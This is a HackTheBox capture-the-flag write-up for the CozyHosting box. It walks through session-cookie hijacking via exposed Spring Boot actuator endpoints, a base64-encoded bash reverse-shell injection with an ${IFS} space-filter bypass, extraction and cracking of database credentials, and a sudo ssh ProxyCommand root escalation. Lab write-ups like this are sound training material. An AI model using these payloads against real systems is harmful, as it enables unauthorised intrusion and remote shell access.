# CozyHosting -- HackTheBox (write-up)

**Difficulty:** Easy
**Box:** CozyHosting (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-01-27

---

## TL;DR

### Spring Boot actuator exposed session cookies. Hijacked admin session, got RCE via command injection in SSH connection feature. Cracked Postgres DB password hash to pivot to user. Privesc via sudo ssh GTFOBins.

---

## Target info

- Host: `10.10.11.230`
- Domain: `cozyhosting.htb`
- Services discovered: `22/tcp (ssh)`, `80/tcp (http)`

---

## Enumeration

![Nmap results](images/cozyhosting-htb_1.png)

Added `cozyhosting.htb` to `/etc/hosts`.

![Web page](images/cozyhosting-htb_2.png)

![Directory enumeration](images/cozyhosting-htb_3.png)

![Spring Boot actuator](images/cozyhosting-htb_4.png)

Found Spring Boot. Actuator endpoints exposed session info:

![Sessions endpoint](images/cozyhosting-htb_5.png)

![Active session](images/cozyhosting-htb_6.png)

Found user: `kanderson`

---

## Foothold

No cookies appeared in storage until a login attempt. After a failed login, replaced the session cookie with `kanderson`'s and reloaded `/admin`:

![Cookie hijack](images/cozyhosting-htb_7.png)

Sent SSH connection request through Burp. Injected a base64-encoded reverse shell in the username field:

```
bash -i >& /dev/tcp/10.10.14.109/443 0>&1
```

Base64: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDkvNDQzIDA+JjEK`

Payload with `${IFS}` to bypass space filtering, URL-encoded:

```
host=localhost&username=%3becho${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMDkvNDQzIDA%2bJjE%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
```

Timeout in Burp meant it worked:

![Shell received](images/cozyhosting-htb_8.png)

![Stabilized shell](images/cozyhosting-htb_9.png)

Stabilized shell and found a `.jar` file. Transferred it to Kali:

```bash
python3 -m http.server 1111
wget http://10.10.11.230:1111/cloudhosting-0.0.1.jar
```

---

## Lateral movement

Opened jar with `jd-gui`, found Postgres creds in `application.properties`:

![DB credentials](images/cozyhosting-htb_10.png)

`postgres:Vg&nvzAQ7XxR`

Connected to the database:

```bash
psql -h 127.0.0.1 postgres
```

![Database listing](images/cozyhosting-htb_11.png)

```
\c cozyhosting
\d
select * from users;
```

![Tables](images/cozyhosting-htb_12.png)

Found bcrypt hashes for `kanderson` and `admin`. Cracked with john:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Cracked hash](images/cozyhosting-htb_13.png)

Password: `manchesterunited`

```bash
su josh
```

---

## Privilege escalation

![sudo -l](images/cozyhosting-htb_14.png)

GTFOBins for `ssh`:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![Root shell](images/cozyhosting-htb_15.png)

---

## Lessons & takeaways

- Spring Boot actuator endpoints can leak active session tokens
- `${IFS}` is useful for bypassing space filters in command injection
- Always check `.jar` files for hardcoded credentials
---
